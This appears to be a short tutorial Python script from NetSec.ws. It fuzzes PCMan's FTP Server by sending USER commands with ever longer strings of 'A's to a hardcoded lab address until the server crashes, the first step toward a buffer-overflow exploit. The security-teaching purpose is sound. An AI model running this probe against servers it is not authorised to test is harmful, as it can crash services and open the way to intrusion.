#!/usr/bin/python3
# Simple Fuzzer for PCMan's FTP Server
# Written for NetSec.ws

import sys, socket, time

# Use in the form "python fuzzer.py  "

host = "192.168.1.14" # Recieve IP from user
port = 21 # Recieve Port from user

length = 100 # Initial length of 100 A's

while (length < 3000): # Stop once we've tried up to 3000 length
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
        client.connect((host, port)) # Connect to user supplied port and IP address
        client.recv(1024) # Recieve FTP Banner
        client.send(b'USER ' + b'A' * length) # Send the user command with a variable length name
        client.recv(1024) # Recieve Reply
        client.send(b'PASS pass') # Send pass to complete connection attempt (will fail)
        client.recv(1024) # Recieve Reply
        client.close() # Close the Connection
        time.sleep(2) # Sleep to prevent DoS crashes
        print('Length Sent: ' + str(length)) # Output the length username sent to the server
        length += 100 # Try again with an increased length
